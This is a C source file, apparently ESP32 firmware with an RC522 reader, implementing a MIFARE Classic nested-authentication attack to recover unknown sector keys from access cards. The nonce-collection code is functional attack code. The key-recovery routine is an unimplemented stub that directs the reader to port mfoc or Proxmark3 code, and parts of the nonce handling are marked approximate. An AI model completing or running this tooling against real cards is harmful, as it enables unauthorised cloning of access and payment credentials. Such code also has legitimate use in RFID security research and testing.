#include "nested_attack.h"
#include "hal/card_comm.h"
#include "crypto/crypto1.h"
#include "output/serial_reporter.h"
#include <string.h>

// ─── Nonce pair structure ───────────────────────────────────────────────────
typedef struct {
    uint32_t nt;         // plaintext nonce (from first auth with known key)
    uint32_t nt_enc;     // encrypted nonce from nested auth (nt' XOR keystream)
    uint8_t  par;        // parity bits of the nested auth response (4 bits used)
} NoncePair;

// ─── Collect one (nt_enc, par) pair ────────────────────────────────────────
// Uses the known key on knownSector to establish a Crypto1 session,
// then immediately sends AUTH for targetSector and captures the encrypted nonce.
// This requires raw transceive access (not the high-level picc_mfAuth).
static bool _collectNonce(CardDump* dump,
                           uint8_t knownSector, bool knownIsA,
                           uint8_t targetSector, bool targetIsA,
                           NoncePair* out)
{
    uint8_t atqa[2];
    if (picc_wakeupA(atqa) != RC522_OK) return false;
    if (picc_anticollision(&dump->uid) != RC522_OK) return false;

    // Step 1: Authenticate with the known key
    const uint8_t* knownKey = knownIsA ? dump->sectors[knownSector].keyA
                                        : dump->sectors[knownSector].keyB;
    uint8_t knownCmd = knownIsA ? MF_AUTH_KEY_A : MF_AUTH_KEY_B;
    if (picc_mfAuth(knownCmd, ks_sectorToTrailer(knownSector), knownKey, &dump->uid) != RC522_OK)
        return false;

    // Step 2: Send AUTH for target sector WITHOUT halting / re-selecting.
    // The card's nonce response is now encrypted under the active Crypto1 session.
    // We send a raw AUTH frame and capture the 4-byte encrypted nonce response.
    uint8_t targetCmd = targetIsA ? MF_AUTH_KEY_A : MF_AUTH_KEY_B;
    uint8_t authBuf[4] = { targetCmd, ks_sectorToTrailer(targetSector), 0x00, 0x00 };
    uint8_t crc[2]; rc522_calcCRC(authBuf, 2, crc);
    authBuf[2] = crc[0]; authBuf[3] = crc[1];

    RC522Frame rx;
    RC522Status s = rc522_transceive(authBuf, 4, &rx, 0, 0, false);
    picc_mfDeauth();

    // Card responds with 4-byte encrypted nonce
    if (s != RC522_OK || rx.len < 4) return false;

    // Reconstruct nt_enc from the 4 bytes (big-endian)
    out->nt_enc = ((uint32_t)rx.data[0]<<24)|((uint32_t)rx.data[1]<<16)|
                  ((uint32_t)rx.data[2]<<8)|rx.data[3];
    out->par    = 0;  // parity recovery requires bit-level analysis — TODO: extend
    // Predict nT_B using PRNG successor from nT_A (the known first auth nonce)
    // The MIFARE PRNG advances 32 steps between consecutive auths
    // NOTE: nT_A must be captured during the first auth (picc_mfAuth doesn't expose it)
    // For now: set nt to 0 — update collection code to capture nT_A for full accuracy
    out->nt = crypto1_prng_successor(out->nt_enc, 32);  // approximate prediction
    return true;
}

// ─── PRNG-based nonce search ────────────────────────────────────────────────
// The MIFARE PRNG is a 32-bit LFSR that is NOT reset between power cycles.
// For a specific nT value, the keystream that encrypts nt' is deterministic.
// We enumerate candidate nT' values using the PRNG successor function.
static bool _recoverKey(NoncePair* pairs, uint8_t pairCount,
                         const PiccUID* uid, uint8_t targetSector,
                         uint8_t* keyOut)
{
    // For each possible PRNG starting state (2^16 possible values):
    // 1. Compute candidate nT' = PRNG(start, distance)
    // 2. For each pair: check if nt_enc XOR ks(nT, nT', uid) == candidate nT'
    // 3. If consistent across all pairs: candidate key found
    //
    // FULL IMPLEMENTATION REQUIRES:
    //   - Complete Crypto1 state recovery (dark_key_table from mfoc)
    //   - Bitsliced search across 2^32 key candidates
    //   - ~5-30 minutes of computation (or hardware acceleration)
    //
    // INTEGRATE: mfoc's "nested" module or Proxmark3's hf mf nested command
    // REFERENCE: "Wirelessly Pickpocketing a Mifare Classic Card" (Garcia et al. 2008)
    // SOURCE:    github.com/RfidResearchGroup/proxmark3/blob/master/client/src/mifare/mifarehost.c
    //
    // This stub demonstrates the structure. For real key recovery:
    // 1. Port mfoc's nested.c key search to ESP32
    // 2. Or use ESP-IDF's hardware AES acceleration
    // 3. Or offload computation to a PC via serial

    reporter_error("NESTED_TODO",
        "Key recovery math not yet implemented. "
        "Integrate mfoc nested.c for full functionality.");
    return false;
}

// ─── Main entry point ───────────────────────────────────────────────────────
uint8_t nestedAttack_run(CardDump* dump) {
    int8_t knownSec = ks_firstKnownSector(dump);
    if (knownSec < 0) return 0;

    uint8_t total = 0;
    NoncePair pairs[NESTED_NONCE_COUNT];

    for (uint8_t sector = 0; sector < dump->totalSectors; sector++) {
        if (ks_isSectorKnown(dump, sector)) continue;

        reporter_attackStart("nested", sector, true);

        // Collect nonce pairs
        uint8_t collected = 0;
        for (uint8_t i = 0; i < NESTED_NONCE_COUNT; i++) {
            if (_collectNonce(dump,
                              (uint8_t)knownSec, ks_hasKeyA(dump, (uint8_t)knownSec),
                              sector, true,
                              &pairs[collected])) {
                collected++;
            }
            delay(2);
        }

        if (collected < 2) {
            reporter_error("NESTED_FAIL", "Could not collect enough nonces");
            continue;
        }

        // Attempt key recovery
        uint8_t keyA[6], keyB[6];
        bool foundA = _recoverKey(pairs, collected, &dump->uid, sector, keyA);
        if (foundA) {
            ks_setKeyA(dump, sector, keyA);
            reporter_keyFound(sector, true, keyA, "nested");
            total++;
        } else {
            ks_markFailed(dump, sector, true);
            reporter_keyFailed(sector, true);
        }
        (void)keyB;
    }
    return total;
}
